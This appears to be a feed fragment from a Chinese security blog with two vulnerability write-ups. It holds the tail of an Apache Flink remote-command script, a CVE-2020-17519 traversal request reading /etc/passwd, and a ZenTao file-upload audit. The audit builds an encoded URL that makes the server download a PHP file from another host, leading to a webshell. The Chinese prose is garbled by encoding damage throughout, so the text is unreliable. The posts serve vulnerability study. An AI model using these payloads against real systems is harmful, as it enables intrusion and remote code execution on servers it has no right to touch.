class="number">-2</span>]</span><br><span class="line">            <span class="keyword">if</span> res:</span><br><span class="line">                print(<span class="string">&#x27;rce command &quot;%s&quot; exec result: %s&#x27;</span> % (command, res))</span><br><span class="line">                state = <span class="number">1</span></span><br><span class="line">                msg = <span class="string">&#x27;%s rce success&#x27;</span> % self.url</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                state = <span class="number">0</span></span><br><span class="line">                msg = <span class="string">&#x27;%s rce failed&#x27;</span> % self.url</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            state = <span class="number">0</span></span><br><span class="line">            msg = <span class="string">&#x27;%s rce failed&#x27;</span> % self.url</span><br><span class="line"></span><br><span class="line">        delete = self.jar_delete</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&#x27;state&#x27;</span>: state, <span class="string">&#x27;version&#x27;</span>: self.get_version, <span class="string">&#x27;msg&#x27;</span>: msg&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    usage = <span class="string">&#x27;python3 script.py ip port command&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) != <span class="number">4</span>:</span><br><span class="line">        print(<span class="string">&#x27;simple usage: %s&#x27;</span> % usage)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        ip = sys.argv[<span class="number">1</span>]</span><br><span class="line">        port = sys.argv[<span class="number">2</span>]</span><br><span class="line">        command = sys.argv[<span class="number">3</span>]</span><br><span class="line">        url = <span class="string">&#x27;http://%s:%s&#x27;</span> % (ip, port)</span><br><span class="line">        res = FlinkRCECheck(url=url).rce(command=command)</span><br><span class="line">        print(res)</span><br><span class="line">            </span><br></pre></td></tr></table></figure><p>åŸæ¥æ˜¯è¦<code>1.9.x</code> ç‰ˆæœ¬çš„ã€‚è¿™é‡Œçš„ç‰ˆæœ¬æ˜¯1.11.xäº†ã€‚æ‡‚æ€ä¹ˆç”¨å°±è¡Œäº†ã€‚ã€‚è€sbäº†ã€‚</p><h2 id="CVE-2020-17519-ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´"><a href="#CVE-2020-17519-ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´" class="headerlink" title="CVE-2020-17519 ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´"></a>CVE-2020-17519 ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;jobmanager&#x2F;logs&#x2F;..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210118194915.png"></p><h1 id="æ¼æ´ä¿®å¤"><a href="#æ¼æ´ä¿®å¤" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h1><p>äº˜å¤ä¸å˜çš„å‡çº§åˆ°æœ€æ–°ç‰ˆã€‚ï¼ˆxã€‚é‚£è¿™è¿˜å­¦ä¸ªå±ã€‚è·Ÿç€commi ï¼Œç®€å•åˆ†æä¸‹ä¸é¦™ï¼Ÿ</p><p>å¯¹<code>../</code>è¿›è¡Œäº†å¤„ç†ã€‚å¸Œæœ›ä¸ä¼šåƒå…¶ä»–æ´ä¸€æ ·å‡ºç°ç»•è¿‡çš„æƒ…å†µ :call_me_hand:</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210118200807.png"></p><p>åé¢è¿˜å¯¹ä¸Šä¼ çš„æ–‡ä»¶å¤§å°ã€å†…å®¹è¿›è¡Œäº†ä¸€äº›åˆ¤æ–­ï¼Œã€‚ä»£ç å¤ªé•¿äº†ä¸æƒ³çœ‹ã€‚</p><p><strong>æˆ‘åˆ†æé”™äº†ã€‚</strong>å…·ä½“çœ‹çœ‹ï¼š</p><p><a href="https://www.anquanke.com/post/id/228507#h3-10">https://www.anquanke.com/post/id/228507#h3-10</a></p><p><a href="https://xz.aliyun.com/t/9023">https://xz.aliyun.com/t/9023</a></p><h1 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h1><p><a href="https://github.com/apache/flink/commit/a5264a6f41524afe8ceadf1d8ddc8c80f323ebc4">https://github.com/apache/flink/commit/a5264a6f41524afe8ceadf1d8ddc8c80f323ebc4</a></p><p><a href="https://github.com/vulhub/vulhub/tree/master/flink/CVE-2020-17518">https://github.com/vulhub/vulhub/tree/master/flink/CVE-2020-17518</a></p><p><a href="https://www.anquanke.com/post/id/227630">https://www.anquanke.com/post/id/227630</a></p><p><a href="https://www.freebuf.com/vuls/260257.html">https://www.freebuf.com/vuls/260257.html</a></p><p><a href="https://www.exploit-db.com/exploits/48978">https://www.exploit-db.com/exploits/48978</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;æ¼æ´èƒŒæ™¯&quot;&gt;&lt;a href=&quot;#æ¼æ´èƒŒæ™¯&quot; class=&quot;headerlink&quot; title=&quot;æ¼æ´èƒŒæ™¯&quot;&gt;&lt;/a&gt;æ¼æ´èƒŒæ™¯&lt;/h1&gt;&lt;p&gt;2021å¹´01æœˆ06æ—¥ï¼ŒApache Flink&lt;code&gt;å‘å¸ƒäº†&lt;/code&gt;Apache Flink ç›®å½•ç©¿è¶Šæ¼æ´,ç›®å½•</summary>
      
    
    
    
    
    <category term="æ¼æ´å¤ç°" scheme="https://hack-for.fun/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>ä»£ç å®¡è®¡ï¼šCNVD-C-2020-121325ï¼šç¦…é“åå°æ–‡ä»¶ä¸Šä¼ æ¼æ´</title>
    <link href="https://hack-for.fun/c5f5.html"/>
    <id>https://hack-for.fun/c5f5.html</id>
    <published>2021-01-15T03:31:29.000Z</published>
    <updated>2021-01-16T06:02:35.235Z</updated>
    
    <content type="html"><![CDATA[<h1 id="æ¼æ´èƒŒæ™¯"><a href="#æ¼æ´èƒŒæ™¯" class="headerlink" title="æ¼æ´èƒŒæ™¯"></a>æ¼æ´èƒŒæ™¯</h1><p>ç¦…é“æ˜¯ç¬¬ä¸€æ¬¾å›½äº§çš„å¼€æºé¡¹ç›®ç®¡ç†è½¯ä»¶ï¼Œå…¶ä½¿ç”¨zentaophpæ¡†æ¶å¼€å‘ï¼Œå†…ç½®äº†æµ‹è¯•ç®¡ç†ã€è®¡åˆ’ç®¡ç†ã€å‘å¸ƒç®¡ç†ã€æ–‡æ¡£ç®¡ç†ã€äº‹åŠ¡ç®¡ç†ç­‰äº§å“ç®¡ç†å’Œé¡¹ç›®ç®¡ç†åŠŸèƒ½ï¼Œå¹¶ä¸ºæ¯ä¸€ä¸ªé¡µé¢æä¾›jsonæ¥å£çš„apiï¼Œæ–¹ä¾¿ä¸å…¶å®ƒè¯­è¨€è°ƒç”¨äº¤äº’ã€‚å†…ç½®å¤šè¯­è¨€ã€å¤šé£æ ¼ã€æœç´¢åŠŸèƒ½ã€ç»Ÿè®¡åŠŸèƒ½ç­‰å¤šç§å®ç”¨åŠŸèƒ½ã€‚</p><p>2020å¹´10æœˆ14æ—¥ï¼Œç¦…é“å®˜ç½‘å‘å¸ƒå®‰å…¨å…¬å‘Šï¼Œç¦…é“å¼€æºé¡¹ç›®ç®¡ç†è½¯ä»¶ä¸­å­˜åœ¨ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼ˆCNVD-C-2020-121325ï¼‰ã€‚<strong>æ”»å‡»è€…å¯ä»¥é€šè¿‡fopen/fread/fwriteæ–¹æ³•ç»“åˆFileã€FTPç­‰åè®®è¯»å–æˆ–ä¸Šä¼ ä»»æ„æ–‡ä»¶ã€‚æˆåŠŸåˆ©ç”¨æ­¤æ¼æ´çš„æ”»å‡»è€…å¯è·å¾—ç›®æ ‡ç³»ç»Ÿæ•æ„Ÿæ–‡ä»¶åŠç³»ç»Ÿç®¡ç†æƒé™ã€‚</strong></p><p>å½±å“ç‰ˆæœ¬ï¼š</p><ul><li>ç¦…é“å¼€æºç‰ˆ12.3.3ã€12.4.1ã€12.4.2</li><li>ç¦…é“:ç¦…é“å¼€æºç‰ˆ&lt;=12.4.2</li></ul><blockquote><p>æ¼æ´åªé€‚ç”¨äºWindowsä¸€é”®å®‰è£…ç‰ˆï¼ˆæœªåŠ å®‰å…¨é™åˆ¶ï¼‰ã€Linuxä¸€é”®å®‰è£…ç‰ˆï¼ˆæœªåŠ å®‰å…¨é™åˆ¶ï¼‰ã€å®‰è£…åŒ…ç‰ˆã€‚Windows/Linuxä¸€é”®å®‰è£…ç‰ˆ(åŠ å…¥å®‰å…¨é™åˆ¶)ç”±äºåšè¿‡æ–°ä¸Šä¼ æ–‡ä»¶é™åˆ¶ï¼Œæ— æ³•æ‰§è¡Œä¸Šä¼ åçš„æ–‡ä»¶ï¼Œå¯¼è‡´æ¼æ´æ— æ³•åˆ©ç”¨ã€‚</p></blockquote><p>åˆ©ç”¨æ¡ä»¶ï¼šéœ€è¦åå°æƒé™</p><p>ç¦…é“å¼€æºç‰ˆ12.4.2ä¸‹è½½åœ°å€ï¼š<a href="https://www.zentao.net/download/zentaopms12.4.2-80263.html">https://www.zentao.net/download/zentaopms12.4.2-80263.html</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https:&#x2F;&#x2F;www.zentao.net&#x2F;dl&#x2F;zentao&#x2F;12.4.2&#x2F;ZenTaoPMS.12.4.2.zip</span><br></pre></td></tr></table></figure><h1 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h1><p>ç¯å¢ƒï¼š</p><p>OSï¼šMacOS</p><p>PHPï¼š5.4.45</p><p>MySQLï¼š5.7.26</p><p>å°†ä¸‹è½½å¥½çš„æºç ï¼Œæ”¾åˆ°MAMP PROçš„hostsçš„Documentç›®å½•å³å¯å¯åŠ¨ç¯å¢ƒã€‚</p><p>è®¿é—® <a href="http://zentaopms:8890/www/install.php">http://zentaopms:8890/www/install.php</a> å³å¯å®‰è£…ç¦…é“</p><p>å®‰è£…å®Œæˆåï¼Œè®¾ç½®è´¦å·å¯†ç ä¸ºå¼±å£ä»¤ï¼Œç¦…é“çš„å®‰å…¨ç­–ç•¥ä¼šè®©ç”¨æˆ·å¼ºåˆ¶æ”¹å¯†ç (æˆ‘æ”¹ä¸ºäº†Admin@123)ï¼Œè¿™ä¸€ç‚¹å¾ˆä¸é”™ã€‚å› ä¸ºè¿™ä¸ªæ¼æ´å‘ç”Ÿåœ¨åå°ï¼Œå¦‚æœæ²¡åŠæ³•è¿›åå°ï¼Œå°±æ²¡åŠæ³•åˆ©ç”¨ã€‚</p><p>å…¶ä»–éƒ½é»˜è®¤å³å¯ã€‚</p><h2 id="åˆ©ç”¨æ–¹æ³•ä¸€"><a href="#åˆ©ç”¨æ–¹æ³•ä¸€" class="headerlink" title="åˆ©ç”¨æ–¹æ³•ä¸€"></a>åˆ©ç”¨æ–¹æ³•ä¸€</h2><p>12.4.2 å’Œ 12.4.3 ä»£ç å¯¹æ¯”ï¼š</p><p><code>module/client/ext/model/xuanxuan.php</code></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210116000837.png"></p><p>æ–°å¢ä»£ç å¦‚ä¸‹ï¼šå³å¯¹æ–‡ä»¶åçš„æ‰©å±•åè¿›è¡Œäº†æ ¡éªŒã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$file      = basename($link);</span><br><span class="line">$extension = substr($file, strrpos($file, <span class="string">&#x27;.&#x27;</span>) + <span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>(strpos(<span class="string">&quot;,&#123;$this-&gt;config-&gt;file-&gt;allowed&#125;,&quot;</span>, <span class="string">&quot;,&#123;$extension&#125;,&quot;</span>) === <span class="literal">false</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br></pre></td></tr></table></figure><p>æ­£å¸¸æƒ…å†µä¸‹ï¼Œè·å–æ–‡ä»¶ååç¼€ï¼Œå¯ä»¥çœ‹åˆ°ï¼Œå¦‚æœæ˜¯éæ³•åç¼€ï¼Œéƒ½ç›´æ¥è¿”å›<code>txt</code></p><p><code>/module/file/model.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Get extension of a file.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  string    $filename</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getExtension</span>(<span class="params">$filename</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $extension = trim(strtolower(pathinfo($filename, PATHINFO_EXTENSION)));</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>($extension) <span class="keyword">or</span> stripos(<span class="string">&quot;,&#123;$this-&gt;config-&gt;file-&gt;dangers&#125;,&quot;</span>, <span class="string">&quot;,&#123;$extension&#125;,&quot;</span>) !== <span class="literal">false</span>) <span class="keyword">return</span> <span class="string">&#x27;txt&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>($extension) <span class="keyword">or</span> stripos(<span class="string">&quot;,&#123;$this-&gt;config-&gt;file-&gt;allowed&#125;,&quot;</span>, <span class="string">&quot;,&#123;$extension&#125;,&quot;</span>) === <span class="literal">false</span>) <span class="keyword">return</span> <span class="string">&#x27;txt&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>($extension == <span class="string">&#x27;php&#x27;</span>) <span class="keyword">return</span> <span class="string">&#x27;txt&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> $extension;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è·Ÿè¿›çˆ¶ç±»<code>downloadZipPackage</code> æ–¹æ³•</p><p><code>/module/client/model.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Download zip package.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> $version</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> $link</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> bool | string</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">downloadZipPackage</span>(<span class="params">$version, $link</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ignore_user_abort(<span class="literal">true</span>);</span><br><span class="line">    set_time_limit(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>($version) || <span class="keyword">empty</span>($link)) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    $dir  = <span class="string">&quot;data/client/&quot;</span> . $version . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">    $link = helper::safe64Decode($link);</span><br><span class="line">    $file = basename($link);</span><br><span class="line">    <span class="keyword">if</span>(!is_dir(<span class="keyword">$this</span>-&gt;app-&gt;wwwRoot . $dir))</span><br><span class="line">    &#123;</span><br><span class="line">        mkdir(<span class="keyword">$this</span>-&gt;app-&gt;wwwRoot . $dir, <span class="number">0755</span>, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!is_dir(<span class="keyword">$this</span>-&gt;app-&gt;wwwRoot . $dir)) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span>(file_exists(<span class="keyword">$this</span>-&gt;app-&gt;wwwRoot . $dir . $file))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> commonModel::getSysURL() . <span class="keyword">$this</span>-&gt;config-&gt;webRoot . $dir . $file;</span><br><span class="line">    &#125;</span><br><span class="line">    ob_clean();</span><br><span class="line">    ob_end_flush();</span><br><span class="line"></span><br><span class="line">    $local  = fopen(<span class="keyword">$this</span>-&gt;app-&gt;wwwRoot . $dir . $file, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">    $remote = fopen($link, <span class="string">&#x27;rb&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>($remote === <span class="literal">false</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">while</span>(!feof($remote))</span><br><span class="line">    &#123;</span><br><span class="line">        $buffer = fread($remote, <span class="number">4096</span>);</span><br><span class="line">        fwrite($local, $buffer);</span><br><span class="line">    &#125;</span><br><span class="line">    fclose($local);</span><br><span class="line">    fclose($remote);</span><br><span class="line">    <span class="keyword">return</span> commonModel::getSysURL() . <span class="keyword">$this</span>-&gt;config-&gt;webRoot . $dir . $file;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>downloadZipPackage</code> æ–¹æ³•ï¼Œè·å–ä¸¤ä¸ªå‚æ•°ï¼Œ<code>version</code> å’Œ <code>link</code> ï¼Œå°†ç¬¬ä¸€ä¸ªå‚æ•°ä½œä¸ºè·¯å¾„ä¸­çš„ä¸€éƒ¨åˆ†è¿›è¡Œæ‹¼æ¥ï¼ˆ<code>data/client/ . $version . &#39;/&#39;</code>ï¼‰ï¼Œç¬¬äºŒä¸ªå‚æ•°é€šè¿‡è°ƒç”¨<code>safe64Decode</code>æ–¹æ³•è¿›è¡Œbase64è§£ç </p><p><code>/framework/base/helper.class.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">static</span> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">safe64Decode</span>(<span class="params">$string</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> base64_decode(strtr($string, <span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¯¥æ–¹æ³•åŒæ—¶å»é™¤å­—ç¬¦ä¸²ä¸­çš„<code>.</code> å’Œ<code>/</code> æ¥é¿å…<code>ç›®å½•ç©¿è¶Šæ¼æ´</code></p><p>æœ€åç”¨<code>fopen</code> å‡½æ•°æ‰“å¼€è¿œç¨‹æˆ–æœ¬åœ°çš„æ–‡ä»¶å‘¢ã€‚</p><p>åœ¨<code>module/client/ext/model/xuanxuan.php</code> ä¸­ï¼Œï¼ˆæ¼æ´å‡½æ•°ï¼‰</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">downloadZipPackage</span>(<span class="params">$version, $link</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $decodeLink = helper::safe64Decode($link);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^https?\:\/\//&#x27;</span>, $decodeLink)) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">parent</span>::downloadZipPackage($version, $link);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¯¥æ–¹æ³•è·å–ä¸¤ä¸ªå‚æ•°ï¼Œç„¶åå¯¹<code>link</code>å‚æ•°è¿›è¡Œ<code>safe64Decode</code>ï¼Œå†åˆ¤æ–­æ˜¯å¦ä¸º<code>https/http</code> åè®®ï¼Œå¦‚æœä¸æ˜¯å°±è¿”å›<code>false</code>ï¼Œæ³¨æ„åˆ°è¿™é‡Œå¹¶æ²¡æœ‰ç”¨<code>/i</code>æ¨¡å¼è¿›è¡ŒåŒ¹é…ï¼Œå¿½ç•¥å¤§å°å†™ã€‚(<strong>æ•…æ­¤å¤„å­˜åœ¨å¤§å°å†™bypass</strong>)å¦‚æœæ»¡è¶³ifè¯­å¥ï¼Œå°±è°ƒç”¨çˆ¶ç±»çš„<code>downloadZipPackage</code>æ–¹æ³•ï¼Œä¸‹è½½<code>zip</code>åŒ…è¿›è¡Œæ›´æ–°ã€‚</p><p>åœ¨<code>/moudle/client/control.php</code>ä¸­çš„<code>download</code>æ–¹æ³•è°ƒç”¨äº†<code>downloadZipPackage</code>æ–¹æ³•ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Download remote package.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $version</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $link</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $os</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">download</span>(<span class="params">$version = <span class="string">&#x27;&#x27;</span>, $link = <span class="string">&#x27;&#x27;</span>, $os = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    set_time_limit(<span class="number">0</span>);</span><br><span class="line">    $result = <span class="keyword">$this</span>-&gt;client-&gt;downloadZipPackage($version, $link);</span><br><span class="line">    <span class="keyword">if</span>($result == <span class="literal">false</span>) <span class="keyword">$this</span>-&gt;send(<span class="keyword">array</span>(<span class="string">&#x27;result&#x27;</span> =&gt; <span class="string">&#x27;fail&#x27;</span>, <span class="string">&#x27;message&#x27;</span> =&gt; <span class="keyword">$this</span>-&gt;lang-&gt;client-&gt;downloadFail));</span><br><span class="line">    $client = <span class="keyword">$this</span>-&gt;client-&gt;edit($version, $result, $os);</span><br><span class="line">    <span class="keyword">if</span>($client == <span class="literal">false</span>) <span class="keyword">$this</span>-&gt;send(<span class="keyword">array</span>(<span class="string">&#x27;result&#x27;</span> =&gt; <span class="string">&#x27;fail&#x27;</span>, <span class="string">&#x27;message&#x27;</span> =&gt; <span class="keyword">$this</span>-&gt;lang-&gt;client-&gt;saveClientError));</span><br><span class="line">    <span class="keyword">$this</span>-&gt;send(<span class="keyword">array</span>(<span class="string">&#x27;result&#x27;</span> =&gt; <span class="string">&#x27;success&#x27;</span>, <span class="string">&#x27;client&#x27;</span> =&gt; $client, <span class="string">&#x27;message&#x27;</span> =&gt; <span class="keyword">$this</span>-&gt;lang-&gt;saveSuccess, <span class="string">&#x27;locate&#x27;</span> =&gt; inlink(<span class="string">&#x27;browse&#x27;</span>)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å»æ‰¾ä¸€ä¸‹ä¸‹è½½æ–‡ä»¶çš„å…¥å£ç‚¹ã€‚å¯¹ç¦…é“çš„è·¯ç”±è§£æåˆ†æ</p><p><code>/framework/base/router.class.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * è®¾ç½®è·¯ç”±(GET æ–¹å¼)ï¼š</span></span><br><span class="line"><span class="comment">     * 1.è®¾ç½®æ¨¡å—åï¼›</span></span><br><span class="line"><span class="comment">     * 2.è®¾ç½®æ–¹æ³•åï¼›</span></span><br><span class="line"><span class="comment">     * 3.è®¾ç½®æ§åˆ¶å™¨æ–‡ä»¶ã€‚</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Set the route according to GET.</span></span><br><span class="line"><span class="comment">     * 1. set the module name.</span></span><br><span class="line"><span class="comment">     * 2. set the method name.</span></span><br><span class="line"><span class="comment">     * 3. set the control file.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> void</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setRouteByGET</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $moduleName = <span class="keyword">isset</span>($_GET[<span class="keyword">$this</span>-&gt;config-&gt;moduleVar]) ? strtolower($_GET[<span class="keyword">$this</span>-&gt;config-&gt;moduleVar]) : <span class="keyword">$this</span>-&gt;config-&gt;default-&gt;module;</span><br><span class="line">        $methodName = <span class="keyword">isset</span>($_GET[<span class="keyword">$this</span>-&gt;config-&gt;methodVar]) ? strtolower($_GET[<span class="keyword">$this</span>-&gt;config-&gt;methodVar]) : <span class="keyword">$this</span>-&gt;config-&gt;default-&gt;method;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;setModuleName($moduleName);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;setMethodName($methodName);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;setControlFile();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>ä»¥åŠ<code>setFlowURI</code>æ–¹æ³•</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210116000856.png"></p><p>ä»æ³¨é‡Šä¸­å¯ä»¥çŸ¥é“ï¼Œå¦‚æœä¸º<code>download</code>é‚£ä¹ˆä¸‹è½½çš„URIåˆ™ä¸ºï¼š</p><p><code>$module-download-1.html</code></p><p>äºæ˜¯æ„é€ payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;zentaopms:8890&#x2F;www&#x2F;client-download-1-SFRUUDovLzE5Mi4xNjguMjI2LjEyOS9waHBpbmZvLnBocA&#x3D;&#x3D;-1.html</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘æœ¬åœ°ç¯å¢ƒä¸çŸ¥é“ä¸ºä»€ä¹ˆåŸå› ï¼Œä¸Šä¼ æˆåŠŸåä¸åƒç½‘ä¸Šçš„æ–‡ç« èƒ½å¤Ÿç›´æ¥å¾—åˆ°å›æ˜¾ã€‚æˆ‘å°±ä¸€ç›´è®¤ä¸ºæ˜¯æ²¡æœ‰å¤ç°æˆåŠŸã€‚</p><p>ç»“æœåœ¨ç›®å½•ä¸‹æ˜¯ä¸Šä¼ æˆåŠŸäº†çš„ã€‚å¦‚ä¸‹å›¾ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210116000921.png"></p><p>è®¿é—®WebShellï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210116000951.png"></p><p>æ‰€ä»¥é€šè¿‡ä»£ç å±‚é¢ç†è§£äº†æ¼æ´åŸç†ä¹‹åï¼Œæ²¡æœ‰å›æ˜¾å‡ºåœ°å€ä¹Ÿä¸€æ 